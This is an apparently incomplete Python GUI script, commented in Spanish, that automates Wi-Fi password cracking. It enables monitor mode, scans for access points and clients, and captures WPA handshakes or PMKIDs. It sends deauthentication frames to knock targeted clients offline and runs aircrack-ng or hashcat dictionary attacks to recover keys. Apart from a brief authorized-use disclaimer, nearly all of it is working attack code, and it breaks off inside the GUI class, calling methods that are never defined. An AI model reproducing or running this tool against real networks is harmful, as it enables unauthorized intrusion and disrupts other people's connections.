# wifi_auditor_gui.py
#
# ADVERTENCIA: Este script es para fines educativos y debe ser utilizado
# únicamente en redes para las que se tiene permiso explícito.

import tkinter as tk
from tkinter import ttk, scrolledtext, filedialog, messagebox
import subprocess
import os
import sys
import threading
import queue
import time
import re
import csv
from datetime import timedelta

# --- Funciones de Backend ---

def check_root():
    """Verifica si el script se ejecuta como root y muestra un error si no."""
    if os.geteuid() != 0:
        messagebox.showerror("Error de Privilegios",
                             "Este script requiere privilegios de superusuario (root).\n"
                             "Por favor, ejecútalo con 'sudo python3 wifi_auditor_gui.py'")
        sys.exit(1)

def check_dependencies(log_queue):
    """Verifica si las herramientas externas requeridas están instaladas."""
    required_tools = ["iw", "airmon-ng", "airodump-ng", "hcxdumptool", "hashcat", "aircrack-ng"]
    missing_tools = []
    for tool in required_tools:
        try:
            subprocess.run(["which", tool], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        except (subprocess.CalledProcessError, FileNotFoundError):
            missing_tools.append(tool)
    
    if missing_tools:
        log_queue.put(f"[!] ERROR: Faltan las siguientes herramientas: {', '.join(missing_tools)}. Por favor, instálalas.")
        messagebox.showerror("Error de Dependencias",
                             f"Faltan las siguientes herramientas del sistema: {', '.join(missing_tools)}.\n"
                             "Por favor, asegúrate de que estén instaladas y en tu PATH.")
        return False
    log_queue.put("[*] Todas las dependencias de herramientas externas encontradas.")
    return True

def find_wireless_interface(log_queue):
    """Encuentra la primera interfaz inalámbrica."""
    try:
        # Intenta obtener interfaces que no estén en modo monitor
        result = subprocess.check_output(['iwconfig'], stderr=subprocess.STDOUT).decode('utf-8')
        # Busca interfaces que NO tengan "Mode:Monitor"
        interfaces = re.findall(r'^(\w+)\s+IEEE\s+\w+\s+Mode:(\w+)', result, re.MULTILINE)
        
        for iface, mode in interfaces:
            if mode != "Monitor":
                log_queue.put(f"[*] Interfaz inalámbrica encontrada: {iface} (Modo: {mode})")
                return iface
        
        # Si no se encontró ninguna en modo Managed, busca cualquier interfaz inalámbrica activa
        result_dev = subprocess.check_output(['iw', 'dev'], stderr=subprocess.STDOUT).decode('utf-8')
        interfaces_dev = re.findall(r'Interface\s+(\w+)', result_dev)
        if interfaces_dev:
            log_queue.put(f"[*] Se encontró una interfaz (potencialmente en modo monitor): {interfaces_dev[0]}. Intentando usarla.")
            return interfaces_dev[0]

        log_queue.put("[!] No se encontraron interfaces inalámbricas activas.")
        return None
    except FileNotFoundError:
        log_queue.put("[!] Error: 'iwconfig' o 'iw' no encontrado. Asegúrate de que las herramientas inalámbricas estén instaladas.")
        return None
    except subprocess.CalledProcessError as e:
        log_queue.put(f"[!] Error al buscar interfaces: {e.output.decode('utf-8').strip()}")
        return None
    except Exception as e:
        log_queue.put(f"[!] Error inesperado al buscar interfaces: {e}")
        return None

def set_monitor_mode(interface, log_queue):
    """Activa el modo monitor y reporta el progreso a la GUI."""
    log_queue.put(f"[*] Activando el modo monitor en {interface}...")
    try:
        log_queue.put("    > Deteniendo procesos conflictivos con airmon-ng...")
        # airmon-ng check kill detiene procesos que podrían interferir
        subprocess.run(["airmon-ng", "check", "kill"], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        log_queue.put(f"    > Activando modo monitor en {interface} con airmon-ng...")
        result = subprocess.run(["airmon-ng", "start", interface], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output = result.stdout.decode('utf-8')
        log_queue.put(output)

        # Airmon-ng a veces cambia el nombre de la interfaz (e.g., wlan0mon)
        monitor_interface_match = re.search(r'\(monitor mode enabled on (.*?)\)', output)
        if monitor_interface_match:
            monitor_interface = monitor_interface_match.group(1)
            log_queue.put(f"[+] Modo monitor activado en {monitor_interface}.")
            return monitor_interface
        
        # Fallback: asumir que el nombre de la interfaz sigue siendo el mismo o buscar 'mon'
        if "monitor mode enabled" in output or "monitor mode vif" in output:
             # Check if the interface name changed (e.g., wlan0 to wlan0mon)
            proc = subprocess.run(['iwconfig'], capture_output=True, text=True)
            if 'Mode:Monitor' in proc.stdout:
                # Find the interface name that has Mode:Monitor
                monitor_if_match = re.search(r'^(\w+)\s+IEEE\s+\w+\s+Mode:Monitor', proc.stdout, re.MULTILINE)
                if monitor_if_match:
                    log_queue.put(f"[+] Modo monitor activado en {monitor_if_match.group(1)}.")
                    return monitor_if_match.group(1)
            
            log_queue.put(f"[+] Modo monitor activado en {interface}.")
            return interface # Assume original interface name if no specific 'mon' interface is found
        
        log_queue.put("[!] airmon-ng no reportó explícitamente el éxito del modo monitor.")
        return None
    except FileNotFoundError as e:
        log_queue.put(f"[!] Error: Comando no encontrado para modo monitor ({e}). Asegúrate de que Aircrack-ng esté instalado.")
        return None
    except subprocess.CalledProcessError as e:
        log_queue.put(f"[!] Error al activar modo monitor: {e.stderr.decode('utf-8').strip()}")
        return None
    except Exception as e:
        log_queue.put(f"[!] Error inesperado al activar modo monitor: {e}")
        return None

def stop_monitor_mode(interface, log_queue):
    """Desactiva el modo monitor y restaura la interfaz."""
    log_queue.put(f"[*] Desactivando el modo monitor en {interface}...")
    try:
        # airmon-ng stop desactiva el modo monitor y reinicia los procesos
        result = subprocess.run(["airmon-ng", "stop", interface], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        log_queue.put(result.stdout.decode('utf-8'))
        log_queue.put(f"[+] Modo monitor desactivado en {interface}.")
        
        # Esperar un momento para que el sistema actualice el estado de la interfaz
        time.sleep(1) 
        
        # Intentar restaurar la interfaz al modo managed si airmon-ng no lo hizo
        try:
            subprocess.run(["iwconfig", interface, "mode", "managed"], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            log_queue.put(f"[+] Interfaz {interface} restaurada al modo managed.")
        except subprocess.CalledProcessError:
            log_queue.put(f"[!] Advertencia: No se pudo restaurar {interface} al modo managed con iwconfig. Intentando con ip link.")
            try:
                subprocess.run(["ip", "link", "set", interface, "down"], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                subprocess.run(["iw", interface, "set", "type", "managed"], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                subprocess.run(["ip", "link", "set", interface, "up"], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                log_queue.put(f"[+] Interfaz {interface} restaurada al modo managed con ip link/iw.")
            except subprocess.CalledProcessError as e:
                log_queue.put(f"[!] ERROR: No se pudo restaurar {interface} al modo managed. Error: {e.stderr.decode('utf-8').strip()}")


    except FileNotFoundError as e:
        log_queue.put(f"[!] Error: Comando no encontrado para desactivar modo monitor ({e}).")
    except subprocess.CalledProcessError as e:
        log_queue.put(f"[!] Error al desactivar modo monitor en {interface}: {e.stderr.decode('utf-8').strip()}")
    except Exception as e:
        log_queue.put(f"[!] Error inesperado al desactivar modo monitor: {e}")


def scan_networks(interface, log_queue, stop_event):
    """Escanea redes Wi-Fi usando airodump-ng."""
    log_queue.put(f"[*] Iniciando escaneo de redes en {interface}...")
    
    # Limpiar archivos de escaneo previos
    for f in ["scan_result-01.csv", "scan_result-01.kismet.csv"]:
        if os.path.exists(f):
            try:
                os.remove(f)
            except OSError as e:
                log_queue.put(f"[!] Advertencia: No se pudo eliminar el archivo previo {f}: {e}")

    scan_process = None
    try:
        # Redirigir stdout y stderr para evitar que airodump-ng escriba en la consola
        # y para poder leer su salida si fuera necesario (aunque con --write y --output-format no lo es tanto)
        scan_process = subprocess.Popen(["airodump-ng", "--write", "scan_result", "--output-format", "csv", interface],
                                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        while scan_process.poll() is None and not stop_event.is_set():
            # Airodump-ng escribe constantemente en el archivo CSV.
            # Solo necesitamos esperar y luego leer el resultado final.
            time.sleep(1) 
        
        if stop_event.is_set():
            log_queue.put("[*] Escaneo de redes detenido por el usuario.")
        else:
            log_queue.put("[*] Escaneo de redes completado o proceso terminado inesperadamente. Analizando resultados...")

    except FileNotFoundError:
        log_queue.put("[!] Error: 'airodump-ng' no encontrado. Asegúrate de que Aircrack-ng esté instalado.")
        return []
    except Exception as e:
        log_queue.put(f"[!] Error al ejecutar airodump-ng: {e}")
        return []
    finally:
        if scan_process and scan_process.poll() is None: # Si el proceso sigue corriendo, mátalo
            scan_process.terminate()
            scan_process.wait(timeout=5)
            if scan_process.poll() is None: # Si todavía no se detiene
                scan_process.kill()
        
    networks = []
    ap_data = {} # Para almacenar información de APs por BSSID
    
    # Intenta leer el archivo CSV. Airodump-ng crea 'scan_result-01.csv'
    csv_file = "scan_result-01.csv"
    if not os.path.exists(csv_file):
        log_queue.put(f"[!] Error: No se encontró el archivo de resultados del escaneo: {csv_file}")
        return []

    try:
        with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
            reader = csv.reader(f)
            ap_section = False
            client_section = False
            for row in reader:
                if len(row) > 0 and row[0].strip() == "BSSID":
                    ap_section = True
                    client_section = False
                    continue
                elif len(row) > 0 and row[0].strip() == "Station MAC":
                    client_section = True
                    ap_section = False
                    continue
                
                if ap_section and len(row) >= 10: # Ajusta según las columnas de airodump-ng CSV
                    try:
                        bssid = row[0].strip()
                        essid = row[13].strip() if len(row) > 13 else "<Hidden>" # ESSID es la última columna
                        channel = row[3].strip()
                        encryption = row[5].strip()
                        # Si ESSID es "" (oculto) y hay un SSID proporcionado en un campo diferente, usar ese.
                        if essid == "" and len(row) > 13 and row[13].strip():
                            essid = row[13].strip()
                        elif essid == "":
                            essid = "<Hidden>" # Asegura que sea Hidden si no se encuentra
                        
                        if bssid and bssid != "BSSID" and bssid != "Station MAC": # Evitar filas de encabezado repetidas
                            ap_data[bssid] = {
                                "ESSID": essid,
                                "Channel": channel,
                                "Encryption": encryption,
                                "Clients": []
                            }
                    except IndexError:
                        log_queue.put(f"[!] Advertencia: Formato de fila AP inesperado: {row}")
                        continue
                elif client_section and len(row) >= 6: # Ajusta según las columnas de clientes
                    try:
                        station_mac = row[0].strip()
                        bssid_ap = row[5].strip() # BSSID del AP al que está conectado el cliente
                        
                        if station_mac and station_mac != "Station MAC" and bssid_ap and bssid_ap in ap_data:
                            ap_data[bssid_ap]["Clients"].append(station_mac)
                    except IndexError:
                        log_queue.put(f"[!] Advertencia: Formato de fila cliente inesperado: {row}")
                        continue

        for bssid, data in ap_data.items():
            # Filtra APs sin ESSID si es necesario, o trata ESSID oculto
            if data["ESSID"] != "" and data["ESSID"] != "<length: 0>":
                networks.append({
                    "BSSID": bssid,
                    "ESSID": data["ESSID"],
                    "Channel": data["Channel"],
                    "Encryption": data["Encryption"],
                    "Clients": data["Clients"]
                })
        
        log_queue.put(f"[*] Escaneo completado. Se encontraron {len(networks)} redes.")
        return networks
    except FileNotFoundError:
        log_queue.put(f"[!] Error: El archivo CSV '{csv_file}' no se encontró después del escaneo.")
        return []
    except Exception as e:
        log_queue.put(f"[!] Error al analizar el archivo CSV de airodump-ng: {e}")
        return []


def capture_handshake_or_pmkid(interface, bssid, channel, essid, target_client_mac=None, log_queue=None, stop_event=None):
    """
    Intenta capturar un handshake WPA/WPA2 o un PMKID.
    Prioriza PMKID si el AP lo soporta.
    """
    if log_queue is None:
        log_queue = queue.Queue() # Crear una cola dummy si no se proporciona

    log_queue.put(f"[*] Iniciando captura para {essid} ({bssid}) en el canal {channel}...")
    capture_file = "capture-01.cap" # Para handshake
    pmkid_file = "pmkid_capture.pcapng" # Para hcxdumptool

    # Limpiar archivos de captura previos
    for f in [capture_file, pmkid_file, "hcxdumptool.log", "airodump.log"]:
        if os.path.exists(f):
            try:
                os.remove(f)
            except OSError as e:
                log_queue.put(f"[!] Advertencia: No se pudo eliminar el archivo previo {f}: {e}")

    # Paso 1: Intentar PMKID con hcxdumptool (más rápido si el AP lo soporta)
    log_queue.put("[*] Intentando capturar PMKID con hcxdumptool...")
    pmkid_process = None
    try:
        # -i: interfaz, -o: salida pcapng, --enable_status=1: output status to stdout
        pmkid_process = subprocess.Popen(
            ["hcxdumptool", "-i", interface, "-o", pmkid_file, "--enable_status=1", f"--filter_client={target_client_mac}" if target_client_mac else ""],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, bufsize=1
        )
        
        timeout_start = time.time()
        pmkid_found = False
        while pmkid_process.poll() is None and not stop_event.is_set() and (time.time() - timeout_start < 30): # 30s para PMKID
            line = pmkid_process.stdout.readline()
            if line:
                log_queue.put(f"[hcxdump] {line.strip()}")
                if "PMKID" in line or "Found EAPOL" in line:
                    log_queue.put("[+] ¡PMKID o EAPOL encontrado por hcxdumptool!")
                    pmkid_found = True
                    break
            time.sleep(0.1)

        if pmkid_found:
            log_queue.put("[*] PMKID posiblemente capturado. Deteniendo hcxdumptool.")
            pmkid_process.terminate()
            pmkid_process.wait(timeout=5)
            if pmkid_process.poll() is None: pmkid_process.kill()

            # Convertir pcapng a formato hashcat hc22000
            if os.path.exists(pmkid_file) and os.path.getsize(pmkid_file) > 0:
                log_queue.put("[*] Convirtiendo PMKID a formato hashcat (hc22000)...")
                try:
                    subprocess.run(["hcxpcaptool", "-o", "pmkid_hash.hc22000", pmkid_file], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    if os.path.exists("pmkid_hash.hc22000") and os.path.getsize("pmkid_hash.hc22000") > 0:
                        log_queue.put("[+] PMKID capturado y convertido exitosamente.")
                        return "pmkid_hash.hc22000"
                    else:
                        log_queue.put("[!] Error: Archivo hc22000 vacío o no creado. PMKID no utilizable.")
                except FileNotFoundError:
                    log_queue.put("[!] Error: 'hcxpcaptool' no encontrado. Necesario para convertir PMKID.")
                except subprocess.CalledProcessError as e:
                    log_queue.put(f"[!] Error al convertir PMKID: {e.stderr.decode('utf-8').strip()}")
            else:
                log_queue.put("[!] Advertencia: El archivo PMKID capturado está vacío o no existe.")
            return None # Fallback to handshake if PMKID failed or not usable

    except FileNotFoundError:
        log_queue.put("[!] Advertencia: 'hcxdumptool' no encontrado. Intentando captura de handshake.")
    except Exception as e:
        log_queue.put(f"[!] Error con hcxdumptool: {e}. Intentando captura de handshake.")
    finally:
        if pmkid_process and pmkid_process.poll() is None:
            pmkid_process.terminate()
            pmkid_process.wait(timeout=5)
            if pmkid_process.poll() is None: pmkid_process.kill()


    # Paso 2: Intentar Handshake con airodump-ng y aireplay-ng (si PMKID falló)
    log_queue.put("[*] Intentando capturar Handshake WPA/WPA2 con airodump-ng y aireplay-ng...")
    
    # Ejecutar airodump-ng en segundo plano para capturar paquetes
    airodump_process = None
    try:
        # Asegurarse de que el canal está configurado correctamente
        subprocess.run(["iwconfig", interface, "channel", channel], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        log_queue.put(f"[*] Canal de interfaz {interface} establecido en {channel}.")

        airodump_process = subprocess.Popen(
            ["airodump-ng", "--bssid", bssid, "--channel", channel, "--write", "capture", "--output-format", "pcap", interface],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        
        log_queue.put(f"[*] Airodump-ng iniciado para capturar handshake de {essid} ({bssid})...")
        time.sleep(5) # Dar tiempo a airodump-ng para iniciarse y capturar algo

        # Si hay un cliente objetivo, intentar desautenticarlo para forzar el handshake
        if target_client_mac:
            log_queue.put(f"[*] Intentando desautenticar al cliente {target_client_mac} de {bssid} para forzar handshake...")
            deauth_count = 0
            while deauth_count < 5 and not stop_event.is_set(): # Intentar deauth varias veces
                try:
                    # -0: desautenticación, 1: número de desautenticaciones, -a: BSSID del AP, -c: MAC del cliente, wlan0mon: interfaz
                    subprocess.run(["aireplay-ng", "-0", "1", "-a", bssid, "-c", target_client_mac, interface],
                                   check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    log_queue.put(f"    > Deauth enviado al cliente {target_client_mac}. Intento {deauth_count + 1}/5.")
                except FileNotFoundError:
                    log_queue.put("[!] Error: 'aireplay-ng' no encontrado.")
                    break # No tiene sentido seguir sin aireplay
                except subprocess.CalledProcessError as e:
                    log_queue.put(f"[!] Error al enviar deauth: {e.stderr.decode('utf-8').strip()}")
                deauth_count += 1
                time.sleep(2) # Esperar un poco entre intentos de deauth
        else:
            log_queue.put("[*] No se especificó un cliente para desautenticar. Esperando handshake pasivamente.")
            time.sleep(10) # Esperar un poco más pasivamente

        # Monitorear si se ha capturado el handshake
        handshake_found = False
        timeout_start = time.time()
        while (time.time() - timeout_start < 60) and not stop_event.is_set(): # Esperar hasta 60 segundos
            if os.path.exists(capture_file) and os.path.getsize(capture_file) > 0:
                try:
                    # Usar aircrack-ng para verificar si hay un handshake válido
                    result = subprocess.run(["aircrack-ng", capture_file], capture_output=True, text=True, timeout=10)
                    if "WPA (0 handshake)" not in result.stdout and "WPA handshake:" in result.stdout:
                        log_queue.put("[+] ¡Handshake WPA/WPA2 capturado y verificado!")
                        handshake_found = True
                        break
                except FileNotFoundError:
                    log_queue.put("[!] Error: 'aircrack-ng' no encontrado para verificar handshake.")
                    break
                except subprocess.CalledProcessError as e:
                    log_queue.put(f"[!] Error al verificar handshake con aircrack-ng: {e.stderr.strip()}")
                except subprocess.TimeoutExpired:
                    log_queue.put("[!] Aircrack-ng se demoró demasiado en la verificación, continuando espera.")
            
            log_queue.put("[*] Esperando handshake...")
            time.sleep(5)

        if handshake_found:
            log_queue.put("[+] Captura completada: Handshake guardado en 'capture-01.cap'")
            return capture_file
        else:
            log_queue.put("[!] No se pudo capturar el handshake WPA/WPA2 en el tiempo esperado.")
            return None

    except FileNotFoundError as e:
        log_queue.put(f"[!] Error: Comando no encontrado ({e}). Asegúrate de que Aircrack-ng esté instalado.")
        return None
    except subprocess.CalledProcessError as e:
        log_queue.put(f"[!] Error durante la captura: {e.stderr.decode('utf-8').strip()}")
        return None
    except Exception as e:
        log_queue.put(f"[!] Error inesperado durante la captura: {e}")
        return None
    finally:
        if airodump_process and airodump_process.poll() is None:
            airodump_process.terminate()
            airodump_process.wait(timeout=5)
            if airodump_process.poll() is None: airodump_process.kill()


def crack_handshake(capture_file, wordlist_file, crack_method, log_queue, stop_event):
    """Intenta descifrar el handshake usando aircrack-ng o hashcat."""
    log_queue.put(f"[*] Iniciando descifrado del archivo '{capture_file}' con la wordlist '{wordlist_file}' usando {crack_method}...")

    if not os.path.exists(capture_file) or os.path.getsize(capture_file) == 0:
        log_queue.put(f"[!] Error: El archivo de captura '{capture_file}' no existe o está vacío. No se puede descifrar.")
        return None

    if not os.path.exists(wordlist_file):
        log_queue.put(f"[!] Error: La wordlist '{wordlist_file}' no existe. No se puede descifrar.")
        return None

    cracking_process = None
    try:
        if crack_method == "aircrack-ng":
            log_queue.put("[*] Usando aircrack-ng para el descifrado...")
            cracking_process = subprocess.Popen(
                ["aircrack-ng", "-w", wordlist_file, capture_file],
                stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, bufsize=1
            )
        elif crack_method == "hashcat":
            log_queue.put("[*] Usando hashcat para el descifrado...")
            # Detectar el modo de hashcat basado en el tipo de archivo
            hashcat_mode = "22000" if capture_file.endswith(".hc22000") else "2500" # WPA/WPA2-EAPOL (2500) o PMKID (22000)
            if hashcat_mode == "2500" and not capture_file.endswith(".cap"):
                 log_queue.put("[!] Advertencia: El modo hashcat 2500 requiere un archivo .cap. No se puede proceder.")
                 return None
            
            # Convierte .cap a .hccapx para hashcat si es necesario
            if capture_file.endswith(".cap") and hashcat_mode == "2500":
                hccapx_file = capture_file.replace(".cap", ".hccapx")
                if not os.path.exists(hccapx_file) or os.path.getsize(hccapx_file) == 0:
                    log_queue.put("[*] Convirtiendo .cap a .hccapx para hashcat...")
                    try:
                        subprocess.run(["aircrack-ng", capture_file, "-J", hccapx_file.replace(".hccapx", "")], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                        # aircrack-ng -J crea un archivo sin extensión, necesitamos renombrarlo
                        if os.path.exists(hccapx_file.replace(".hccapx", "")):
                            os.rename(hccapx_file.replace(".hccapx", ""), hccapx_file)
                            log_queue.put(f"[+] Archivo convertido a {hccapx_file}.")
                            capture_file = hccapx_file # Usar el nuevo archivo
                        else:
                            log_queue.put("[!] Error: No se pudo crear el archivo .hccapx. Hashcat no continuará.")
                            return None
                    except FileNotFoundError:
                        log_queue.put("[!] Error: 'aircrack-ng' no encontrado para la conversión .hccapx.")
                        return None
                    except subprocess.CalledProcessError as e:
                        log_queue.put(f"[!] Error al convertir a .hccapx: {e.stderr.decode('utf-8').strip()}")
                        return None
            
            cracking_process = subprocess.Popen(
                ["hashcat", "-m", hashcat_mode, "-a", "0", capture_file, wordlist_file, "--show"], # -a 0 para ataque de diccionario
                stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, bufsize=1
            )
        else:
            log_queue.put("[!] Método de cracking no soportado.")
            return None

        password_found = None
        for line in cracking_process.stdout:
            if stop_event.is_set():
                log_queue.put("[*] Descifrado detenido por el usuario.")
                break
            log_queue.put(f"[{crack_method}] {line.strip()}")
            if crack_method == "aircrack-ng" and "KEY FOUND!" in line:
                match = re.search(r'\[(.*?)\]', line)
                if match:
                    password_found = match.group(1)
                    log_queue.put(f"[+] ¡Contraseña encontrada: {password_found}!")
                    break
            elif crack_method == "hashcat" and ":" in line and not line.startswith("hashcat ("):
                # Hashcat muestra el hash:contraseña_encontrada
                parts = line.strip().split(':')
                if len(parts) >= 2: # Should be hash:password or hash:essid:password etc.
                    # For mode 22000 (PMKID), output is often hash:password
                    # For mode 2500 (WPA), output is often hash:ESSID:password
                    if hashcat_mode == "22000":
                        password_found = parts[1] # Assumes first part is hash, second is password
                    elif hashcat_mode == "2500" and len(parts) >= 3:
                        password_found = parts[2] # Assumes hash:ESSID:password
                    else: # Fallback for unexpected formats
                         password_found = parts[-1] # take the last part as password
                    
                    if password_found and not password_found.startswith("$"): # Avoid showing hash as password
                        log_queue.put(f"[+] ¡Contraseña encontrada por Hashcat: {password_found}!")
                        break

        if password_found:
            return password_found
        else:
            log_queue.put("[!] El descifrado no encontró la contraseña.")
            return None

    except FileNotFoundError as e:
        log_queue.put(f"[!] Error: Herramienta de descifrado no encontrada ({e}). Asegúrate de que {crack_method} esté instalado.")
        return None
    except subprocess.CalledProcessError as e:
        log_queue.put(f"[!] Error durante el descifrado con {crack_method}: {e.stderr.decode('utf-8').strip()}")
        return None
    except Exception as e:
        log_queue.put(f"[!] Error inesperado durante el descifrado: {e}")
        return None
    finally:
        if cracking_process and cracking_process.poll() is None:
            cracking_process.terminate()
            cracking_process.wait(timeout=5)
            if cracking_process.poll() is None: cracking_process.kill()


# --- Clase de la Aplicación GUI ---

class WiFiAuditorApp:
    def __init__(self, master):
        self.master = master
        master.title("Auditor Wi-Fi Ético")
        master.geometry("800x700")

        # Variables de estado
        self.interface = None
        self.monitor_interface = None # La interfaz con el sufijo 'mon' si aplica
        self.networks = []
        self.selected_network_bssid = None
        self.selected_network_essid = None
        self.selected_network_channel = None
        self.selected_client_mac = None

        self.scan_thread = None
        self.attack_thread = None
        self.stop_event = threading.Event()
        self.log_queue = queue.Queue()

        self.attack_start_time = None
        self.elapsed_time = tk.StringVar(value="00:00:00")
        self.update_timer_id = None # Para cancelar el bucle after

        self.create_widgets()
        self.process_queue() # Iniciar el procesamiento de la cola de logs

        master.protocol("WM_DELETE_WINDOW", self.on_closing)
        
        # Verificar permisos de root al inicio
        check_root()
        # Verificar dependencias al inicio
        if not check_dependencies(self.log_queue):
            messagebox.showerror("Error", "El script no puede iniciarse debido a dependencias faltantes.")
            master.destroy()
            return
        
        # Encontrar la interfaz inicial
        self.find_interface()
        
        self.log_queue.put("[*] Script de Auditoría Wi-Fi iniciado. ¡Úsalo éticamente!")

    def create_widgets(self):
        # Frame principal
        main_frame = ttk.Frame(self.master, padding="10")
        main_frame.pack(fill=tk.BOTH, expand=True)

        # Configuración de interfaz
        interface_frame = ttk.LabelFrame(main_frame, text="Configuración de Interfaz", padding="10")
        interface_frame.pack(fill=tk.X, pady=5)

        ttk.Label(interface_frame, text="Interfaz:").grid(row=0, column=0, padx=5, pady=2, sticky="w")
        self.interface_var = tk.StringVar()
        self.interface_label = ttk.Label(interface_frame, textvariable=self.interface_var)
        self.interface_label.grid(row=0, column=1, padx=5, pady=2, sticky="w")
        
        self.find_interface_btn = ttk.Button(interface_frame, text="Detectar Interfaz", command=self.find_interface)
        self.find_interface_btn.grid(row=0, column=2, padx=5, pady=2)
        
        self.monitor_mode_btn = ttk.Button(interface_frame, text="Activar Modo Monitor", command=self.toggle_monitor_mode, state=tk.DISABLED)
        self.monitor_mode_btn.grid(row=0, column=3, padx=5, pady=2)

        # Escaneo de redes
        scan_frame = ttk.LabelFrame(main_frame, text="Escaneo de Redes", padding="10")
        scan_frame.pack(fill=tk.BOTH, expand=True, pady=5)

        self.scan_btn = ttk.Button(scan_frame, text="Iniciar Escaneo", command=self.start_scan, state=tk.DISABLED)
        self.scan_btn.pack(pady=5)

        self.networks_tree = ttk.Treeview(scan_frame, columns=("BSSID", "ESSID", "Canal", "Cifrado", "Clientes"), show="headings")
        self.networks_tree.heading("BSSID", text="BSSID")
        self.networks_tree.heading("ESSID", text="ESSID")
        self.networks_tree.heading("Canal", text="Canal")
        self.networks_tree.heading("Cifrado", text="Cifrado")
        self.networks_tree.heading("Clientes", text="Clientes")
        
        self.networks_tree.column("BSSID", width=120, anchor="center")
        self.networks_tree.column("ESSID", width=150, anchor="w")
        self.networks_tree.column("Canal", width=60, anchor="center")
        self.networks_tree.column("Cifrado", width=100, anchor="center")
        self.networks_tree.column("Clientes", width=80, anchor="center")

        self.networks_tree.pack(fill=tk.BOTH, expand=True, pady=5)
        self.networks_tree.bind("<<TreeviewSelect>>", self.on_network_select)

        # Controles de ataque
        attack_frame = ttk.LabelFrame(main_frame, text="Opciones de Ataque", padding="10")
        attack_frame.pack(fill=tk.X, pady=5)

        ttk.Label(attack_frame, text="Red Seleccionada:").grid(row=0, column=0, padx=5, pady=2, sticky="w")
        self.selected_network_var = tk.StringVar()
        ttk.Label(attack_frame, textvariable=self.selected_network_var).grid(row=0, column=1, columnspan=3, padx=5, pady=2, sticky="w")
        
        ttk.Label(attack_frame, text="Cliente Objetivo (MAC, opcional):").grid(row=1, column=0, padx=5, pady=2, sticky="w")
        self.client_mac_entry = ttk.Entry(attack_frame, width=20)
        self.client_mac_entry.grid(row=1, column=1, padx=5, pady=2, sticky="w")
        ttk.Label(attack_frame, text="  (Para forzar handshake)").grid(row=1, column=2, columnspan=2, padx=5, pady=2, sticky="w")

        ttk.Label(attack_frame, text="Wordlist:").grid(row=2, column=0, padx=5, pady=2, sticky="w")
        self.wordlist_path_var = tk.StringVar()
        self.wordlist_entry = ttk.Entry(attack_frame, textvariable=self.wordlist_path_var, width=40, state="readonly")
        self.wordlist_entry.grid(row=2, column=1, padx=5, pady=2, sticky="ew", columnspan=2)
        self.browse_wordlist_btn = ttk.Button(attack_frame, text="Examinar", command=self.browse_wordlist)
        self.browse_wordlist_btn.grid(row=2, column=3, padx=5, pady=2)

        ttk.Label(attack_frame, text="Método de Crack:").grid(row=3, column=0, padx=5, pady=2, sticky="w")
        self.crack_method_var = tk.StringVar(value="aircrack-ng")
        self.aircrack_radio = ttk.Radiobutton(attack_frame, text="Aircrack-ng", variable=self.crack_method_var, value="aircrack-ng")
        self.aircrack_radio.grid(row=3, column=1, padx=5, pady=2, sticky="w")
        self.hashcat_radio = ttk.Radiobutton(attack_frame, text="Hashcat (experimental)", variable=self.crack_method_var, value="hashcat")
        self.hashcat_radio.grid(row=3, column=2, padx=5, pady=2, sticky="w")

        self.start_attack_btn = ttk.Button(attack_frame, text="Iniciar Ataque", command=self.start_attack, state=tk.DISABLED)
        self.start_attack_btn.grid(row=4, column=0, padx=5, pady=5)
        self.stop_attack_btn = ttk.Button(attack_frame, text="Detener Ataque", command=self.stop_attack, state=tk.DISABLED)
        self.stop_attack_btn.grid(row=4, column=1, padx=5, pady=5)
        
        ttk.Label(attack_frame, text="Tiempo Transcurrido:").grid(row=4, column=2, padx=5, pady=2, sticky="w")
        ttk.Label(attack_frame, textvariable=self.elapsed_time, font=("Helvetica", 10, "bold")).grid(row=4, column=3, padx=5, pady=2, sticky="w")


        # Ventana de log
        log_frame = ttk.LabelFrame(main_frame, text="Registro de Actividad", padding="10")
        log_frame.pack(fill=tk.BOTH, expand=True, pady=5)

        self.log_text = scrolledtext.ScrolledText(log_frame, wrap=tk.WORD, height=10, state='disabled', font=("Consolas", 9))
        self.log_text.pack(fill=tk.BOTH, expand=True)

    def process_queue(self):
        """Procesa los mensajes de la cola y los muestra en el log."""
        try:
            while True:
                message = self.log_queue.get_nowait()
                self.log_text.config(state='normal')
                self.log_text.insert(tk.END, message + '\n')
                self.log_text.see(tk.END)
                self.log_text.config(state='disabled')
                self.log_queue.task_done()
        except queue.Empty:
            pass
        self.master.after(100, self.process_queue) # Vuelve a chequear cada 100ms

    def update_timer(self):
        """Actualiza el temporizador de tiempo transcurrido."""
        if self.attack_start_time:
            delta = timedelta(seconds=int(time.time() - self.attack_start_time))
            self.elapsed_time.set(str(delta))
        self.update_timer_id = self.master.after(1000, self.update_timer) # Actualiza cada segundo

    def find_interface(self):
        """Intenta encontrar la interfaz inalámbrica y actualizar la GUI."""
        self.log_queue.put("[*] Buscando interfaces inalámbricas...")
        found_interface = find_wireless_interface(self.log_queue)
        if found_interface:
            self.interface = found_interface
            self.interface_var.set(f"{self.interface} (No en modo monitor)")
            self.log_queue.put(f"[+] Interfaz detectada: {self.interface}")
            self.monitor_mode_btn.config(state=tk.NORMAL, text="Activar Modo Monitor")
            self.scan_btn.config(state=tk.DISABLED) # Solo se puede escanear en modo monitor
            self.start_attack_btn.config(state=tk.DISABLED)
        else:
            self.interface = None
            self.interface_var.set("No detectada")
            self.log_queue.put("[!] No se encontró ninguna interfaz inalámbrica.")
            self.monitor_mode_btn.config(state=tk.DISABLED)
